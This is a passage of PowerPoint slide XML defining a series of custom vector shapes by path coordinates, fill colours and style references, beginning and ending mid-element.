                  <a:pt x="1" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="16"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="21"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="34"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="34"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="21"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="16"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="2"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="bfffff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="687" name="CustomShape 303"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3768840" y="3530520"/>
            <a:ext cx="35640" cy="143640"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="23" h="91">
                <a:moveTo>
                  <a:pt x="23" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="22" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="16"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="64"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="91"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="91"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="87"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="80"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="70"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="23" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="59b2ff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="688" name="CustomShape 304"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3770280" y="3541680"/>
            <a:ext cx="29520" cy="121680"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="19" h="77">
                <a:moveTo>
                  <a:pt x="19" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="19" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="23"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="53"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="74"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="59"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="48"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="72c6ff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="689" name="CustomShape 305"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3772080" y="3549600"/>
            <a:ext cx="23040" cy="102600"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="15" h="65">
                <a:moveTo>
                  <a:pt x="15" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="15" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="20"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="62"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="58"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="19"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="8cd8ff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="690" name="CustomShape 306"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3772080" y="3559320"/>
            <a:ext cx="19800" cy="81720"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="13" h="52">
                <a:moveTo>
                  <a:pt x="13" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="13" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="25"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="37"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="52"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="52"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="51"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="16"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="a5edff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="691" name="CustomShape 307"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3773520" y="3570120"/>
            <a:ext cx="15120" cy="59760"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="10" h="38">
                <a:moveTo>
                  <a:pt x="10" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="10" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="18"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="38"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="38"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="37"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="bfffff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="692" name="CustomShape 308"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3646440" y="3552840"/>
            <a:ext cx="70560" cy="86760"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="45" h="55">
                <a:moveTo>
                  <a:pt x="3" y="5"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="3" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="21"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="55"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="53"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="51"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="49"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="38"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="21"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="18"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="16"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="33" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="36" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="41" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="45" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="44" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="43" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="42" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="40" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="31" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="5"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="999999"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="693" name="CustomShape 309"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3544920" y="3618000"/>
            <a:ext cx="57960" cy="15120"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="37" h="10">
                <a:moveTo>
                  <a:pt x="0" y="7"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="31" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="36" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="24" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="7"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="694" name="CustomShape 310"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3544920" y="3578400"/>
            <a:ext cx="57960" cy="16920"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="37" h="11">
                <a:moveTo>
                  <a:pt x="0" y="7"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="31" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="36" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="24" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="7"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="695" name="CustomShape 311"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3600360" y="3559320"/>
            <a:ext cx="94680" cy="180360"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="60" h="114">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="110"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="114"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="98"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="60" y="105"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="60" y="100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30" y="96"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29" y="83"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="83"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="81"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="60"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="48"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="34"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="20"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="001999"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="696" name="CustomShape 312"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3648240" y="3519360"/>
            <a:ext cx="123120" cy="23040"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="78" h="15">
                <a:moveTo>
                  <a:pt x="0" y="15"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="23" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="42" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="48" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="55" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="62" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="69" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="78" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="74" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="70" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="65" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="61" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="56" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="50" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="43" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="3"/>
                </a:lnTo>
                <a:lnTo>
